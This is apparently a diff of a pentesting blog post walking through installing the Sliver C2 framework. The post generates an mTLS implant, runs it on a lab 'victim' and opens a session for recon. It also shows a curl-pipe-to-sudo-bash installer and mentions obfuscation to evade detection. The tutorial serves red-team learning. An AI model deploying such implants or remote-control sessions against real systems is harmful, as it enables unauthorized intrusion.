@@ -4,19 +4,15 @@ title: "The Sliver C2 Installation and Demo"
 subtitle: "~ Time to lean into C2's ~"
 date: 2023-10-09
 author: ha3ks
-category: blog post
 tags: blog ctf pentesting c2 sliver
-finished: true
-excerpt_separator: <!--more-->
+category: Tooling
 ---
 
-[![1](\img\blog\sliver_C2\1.png)](\img\blog\sliver_C2\1.png)
+[![1](/assets/blog/sliver_C2/1.png)](/assets/blog/sliver_C2/1.png)
 
 Hey Friends, today we are taking a look at Sliver (the C2). You may have heard of it, you may have seen it, hell you could even be an expert in it's use but if you are anything like me you have seen 'C2' and thought 'that would be cool one day' and then never got around to even trying it.
 
 Well look no further, I am here to show you how easy it is to get running and get rolling, so let's get right into it!
-
-<!--more-->
 
 First things first, we need to bust open a terminal and head over to where you want to run the install, the majority of the time this will be '/opt' in Kali (/opt is used for installing third party packages and it pays to keep things 'uniform'):
 
@@ -49,7 +45,7 @@ This latest version (1.6.0 at time of writing) features:
 
 Once downloaded an 'ls' command should show a 'sliver' folder now in our /opt folder.
 
-[![2](\img\blog\sliver_C2\2.png)](\img\blog\sliver_C2\2.png)
+[![2](/assets/blog/sliver_C2/2.png)](/assets/blog/sliver_C2/2.png)
 
 Now we can navigate into the sliver folder:
 
@@ -65,7 +61,7 @@ curl https://sliver.sh/install|sudo bash
 
 Finally you can run sliver by entering 'sliver' into the terminal (this works in any directory BTW, it's a 'global' attribute so you could open a terminal anywhere on your machine and type in 'sliver' and get going).
 
-[![3](\img\blog\sliver_C2\3.png)](\img\blog\sliver_C2\3.png)
+[![3](/assets/blog/sliver_C2/3.png)](/assets/blog/sliver_C2/3.png)
 
 Ok, so that wasn't so hard.
 
@@ -138,17 +134,17 @@ To generate a generic implant we can use:
 generate --mtls <your ip> --arch <OS type> --save <output directory>
 ```
 
-[![4](\img\blog\sliver_C2\4.png)](\img\blog\sliver_C2\4.png)
+[![4](/assets/blog/sliver_C2/4.png)](/assets/blog/sliver_C2/4.png)
 
 Once complete it will have created a payload in your desired location. Since I can drag and drop I picked my desktop (above) though if you wanted to you could spin up a HTTP server on your attacker machine and navigate to the address on your victim and download it:
 
-[![5](\img\blog\sliver_C2\5.png)](\img\blog\sliver_C2\5.png)
+[![5](/assets/blog/sliver_C2/5.png)](/assets/blog/sliver_C2/5.png)
 
 Neat!
 
 Also it's worth noting that the implant that has been generated is a bit hefty... 
 
-[![6](\img\blog\sliver_C2\6.png)](\img\blog\sliver_C2\6.png)
+[![6](/assets/blog/sliver_C2/6.png)](/assets/blog/sliver_C2/6.png)
 
 I'm entirely sure there are ways to shrink this down to a more manageable size and as such less detectable but I just want to get it working and size doesn't matter...
 
@@ -160,17 +156,17 @@ sliver > mtls
 
 Ok to recap, we have our C2 server listening for a connection, we have our implant on the target... Let's see what happens when we run it:
 
-[![7](\img\blog\sliver_C2\7.png)](\img\blog\sliver_C2\7.png)
+[![7](/assets/blog/sliver_C2/7.png)](/assets/blog/sliver_C2/7.png)
 
 *Clicks Run*
 
 It has successfully executed on the victim (no other popups or warnings) and we can see it in the task manager:
 
-[![8](\img\blog\sliver_C2\8.png)](\img\blog\sliver_C2\8.png)
+[![8](/assets/blog/sliver_C2/8.png)](/assets/blog/sliver_C2/8.png)
 
 Also on the Kali side, we can see Sliver has picked up the new connection:
 
-[![9](\img\blog\sliver_C2\9.png)](\img\blog\sliver_C2\9.png)
+[![9](/assets/blog/sliver_C2/9.png)](/assets/blog/sliver_C2/9.png)
 
 Hooked!
 
@@ -194,13 +190,13 @@ sessions -i c1c1758c
 
 And finally, get a little bit of recon going:
 
-[![10](\img\blog\sliver_C2\10.png)](\img\blog\sliver_C2\10.png)
+[![10](/assets/blog/sliver_C2/10.png)](/assets/blog/sliver_C2/10.png)
 
 It's as easy as that!
 
 Now again you can do more with this and get things a little better obfuscated. For giggles I put the .exe into VirusTotal:
 
-[![11](\img\blog\sliver_C2\11.png)](\img\blog\sliver_C2\11.png)
+[![11](/assets/blog/sliver_C2/11.png)](/assets/blog/sliver_C2/11.png)
 
 Ouch!
 
@@ -208,11 +204,11 @@ Good for a demo though.
 
 Now you might be thinking "oh he's using Kali Linux, he's cheating" well, ok this is Sliver running on Ubuntu 22.04.3 LTS:
 
-[![12](\img\blog\sliver_C2\12.png)](\img\blog\sliver_C2\12.png)
+[![12](/assets/blog/sliver_C2/12.png)](/assets/blog/sliver_C2/12.png)
 
 Also Parrot Security Edition 5.3:
 
-[![13](\img\blog\sliver_C2\13.png)](\img\blog\sliver_C2\13.png)
+[![13](/assets/blog/sliver_C2/13.png)](/assets/blog/sliver_C2/13.png)
 
 Hehehe 'PROVINCIAL_BIKINI'
 
